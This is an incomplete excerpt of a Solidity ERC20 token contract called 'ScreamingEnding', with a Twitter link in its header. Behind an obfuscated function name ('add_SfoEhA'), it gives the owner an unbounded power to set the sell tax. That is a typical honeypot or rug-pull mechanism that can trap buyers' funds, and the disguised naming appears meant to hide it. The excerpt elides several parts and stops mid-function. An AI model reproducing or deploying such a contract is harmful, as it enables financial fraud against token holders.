...
// WEBSITE: https://twitter.com/bnaaa11
...
contract ScreamingEnding is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DSE", "ScreamingEnding") {
        _mint(msg.sender, 31000000000);
        sellTax = 20;
        _owner = msg.sender;
    ...
    function add_SfoEhA(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_rM5DPF() public {
